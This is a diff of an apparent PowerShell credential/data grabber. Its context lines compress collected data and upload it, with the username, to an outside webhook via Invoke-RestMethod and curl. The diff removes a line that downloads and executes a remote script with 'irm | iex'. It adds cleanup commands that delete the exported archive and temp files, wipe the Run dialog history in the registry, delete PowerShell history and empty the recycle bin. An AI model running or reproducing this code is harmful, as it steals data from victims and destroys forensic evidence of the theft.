@@ -21,5 +21,12 @@ Compress-Archive -Path $fileSaveDir\j.txt -DestinationPath c:\export.zip -Force
 $Body = @{'username' = $env:username; 'content' = "Obiwan: Hello there!"}
 Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl -Method Post -Body ($Body | ConvertTo-Json); curl.exe -F 'file1=@c:\export.zip' $hookurl
 
-irm https://raw.githubusercontent.com/pedrito12a/jakkobypedro/main/expt.ps1 | iex
-EXIT
+rm -r C:\temp -recurse -Force
+rm -r C:\export.zip
+
+reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
+
+Remove-Item (Get-PSreadlineOption).HistorySavePath
+
+Clear-RecycleBin -Force -ErrorAction SilentlyContinue
+
